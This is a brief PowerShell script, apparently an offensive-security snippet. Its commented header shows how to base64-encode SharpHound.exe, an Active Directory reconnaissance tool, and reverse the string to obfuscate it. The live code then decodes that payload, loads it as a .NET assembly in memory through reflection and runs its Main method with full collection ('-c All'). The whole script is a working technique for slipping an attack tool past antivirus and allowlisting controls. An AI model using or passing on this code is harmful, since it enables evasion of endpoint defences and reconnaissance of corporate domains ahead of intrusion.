# $path = Resolve-Path "C:\Users\Luca\Downloads\whitelisted\SharpHound.exe"
# $data = [IO.File]::ReadAllBytes($path)
# $encoded = [Convert]::ToBase64String($data)
# $encoded[-1..-$encoded.Length] -join "" | Out-File -FilePath "payload.txt"

using namespace System.Reflection
$payload = $payload[-1..-$payload.Length] -join ""
$payload = [Convert]::FromBase64String($payload)
$assembly = [Assembly]::Load($payload)
$type = $assembly.GetType("Sharphound.Program")
$method = $type.GetMethod("Main", [BindingFlags]::Static -bor [BindingFlags]::Public)
[string[]]$arguments = @("-c", "All")
$task = $method.Invoke($null, @(,$arguments))
$task.Wait()